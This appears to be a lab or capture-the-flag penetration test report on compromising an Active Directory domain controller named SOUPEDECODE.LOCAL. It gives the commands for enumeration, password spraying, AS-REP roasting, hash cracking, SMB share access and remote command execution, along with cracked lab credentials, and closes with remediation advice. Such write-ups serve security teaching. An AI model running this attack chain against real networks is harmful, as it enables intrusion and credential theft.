# SOUPEDECODE

## 1. Executive Summary

This report documents the compromise of a Windows Active Directory environment identified as **SOUPEDECODE.LOCAL**.  
The attack chain leveraged weak password practices, Kerberos misconfiguration (AS-REP roasting), and credential reuse to gain access to sensitive SMB shares and execute commands.

**Impact:**
- Compromise of domain user accounts
- Credential disclosure (cleartext passwords and hashes)
- Unauthorized SMB access to sensitive data
- Potential remote command execution

---

## 2. Scope

Target: 10.129.158.130  
Host: DC01  
Domain: SOUPEDECODE.LOCAL  

---

## 3. Enumeration

### Nmap Scan

```bash
nmap -sC -sV 10.129.158.130
```

### Open Ports

- 53/tcp → DNS
- 88/tcp → Kerberos
- 135/tcp → RPC
- 139/tcp → NetBIOS
- 389/tcp → LDAP
- 445/tcp → SMB
- 464/tcp → Kerberos password change
- 593/tcp → RPC over HTTP
- 636/tcp → LDAPS
- 3268/tcp → Global Catalog LDAP
- 3269/tcp → Global Catalog LDAPS
- 3389/tcp → RDP

**Observation:**
Target is a Domain Controller.

---

## 4. User Enumeration

Using Impacket:

```bash
impacket-GetADUsers SOUPEDECODE.LOCAL/ -dc-ip 10.129.158.130
```

Extracted domain users and saved to:

```bash
users.txt
```

---

## 5. Password Spraying

Using Kerbrute:

```bash
kerbrute passwordspray -d SOUPEDECODE.LOCAL users.txt users.txt
```

### Valid Credentials Found:

```
Username: ybob317
Password: ybob317
```

**Finding:**
Weak password policy (username = password)

---

## 6. AS-REP Roasting

Using Impacket:

```bash
impacket-GetNPUsers SOUPEDECODE.LOCAL/ -usersfile users.txt -request -dc-ip 10.129.158.130
```

Retrieved Kerberos AS-REP hashes.

---

## 7. Hash Cracking

Using Hashcat:

```bash
hashcat -m 18200 hashes.txt rockyou.txt
```

### Cracked Credential:

```
User: file_scv
Password: Password123!!
```

---

## 8. SMB Access

Connecting using cracked credentials:

```bash
smbclient -L //10.129.158.130 -U file_scv
```

Accessed share:

```
/backup
```

---

### Extracted File:

```bash
smbclient //10.129.158.130/backup -U file_scv
get backup_extract.txt
```

---

## 9. Lateral Movement / Command Execution

Using NetExec (nxc):

```bash
nxc smb 10.129.158.130 -u file_scv -p Password123!! -x "whoami"
```

Or with hash:

```bash
nxc smb 10.129.158.130 -u file_scv -H <HASH> -x "whoami"
```

---

## 10. Findings Summary

| Finding | Severity |
|--------|---------|
| Weak Password Policy | Critical |
| AS-REP Roasting Enabled | High |
| Credential Reuse | High |
| SMB Sensitive Data Exposure | High |
| Remote Command Execution | Critical |

---

## 11. Remediation

### Password Security
- Enforce strong password policies
- Prevent username = password
- Implement account lockout policies

### Kerberos Hardening
- Disable AS-REP roasting (require pre-authentication)
- Audit Kerberos configuration

### SMB Security
- Restrict access to sensitive shares
- Apply least privilege principle

### Monitoring & Logging
- Enable audit logs for authentication
- Detect password spraying attempts

---

## 12. Conclusion

This assessment demonstrates how weak credentials and misconfigured Kerberos can lead to full domain compromise.

**Key Insight:**
> A single weak password can lead to complete Active Directory compromise.

---

## 13. Screenshots (Placeholders)

- [ ] Nmap scan results
- [ ] Kerbrute password spray success
- [ ] AS-REP hash extraction
- [ ] Hashcat cracking output
- [ ] SMB share access
- [ ] Command execution via NetExec

---
